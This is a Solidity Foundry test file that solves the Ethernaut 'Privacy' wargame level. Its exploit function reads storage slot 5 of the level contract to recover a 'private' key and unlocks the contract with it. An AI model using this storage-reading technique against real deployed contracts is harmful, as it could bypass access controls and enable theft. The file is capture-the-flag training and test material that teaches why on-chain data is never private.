// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {Privacy} from "../levels/Privacy/Privacy.sol";
import {PrivacyFactory} from "../levels/Privacy/PrivacyFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract PrivacyTest is LevelTest {
    Privacy private level;

    constructor() {
        levelFactory = new PrivacyFactory();
    }

    function testPrivacy() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = Privacy(levelAddress);

        assertTrue(level.locked());
    }

    function exploit() internal override {
        vm.startPrank(player);

        bytes32 key = vm.load(address(level), bytes32(uint256(5)));
        level.unlock(bytes16(key));

        vm.stopPrank();
    }
}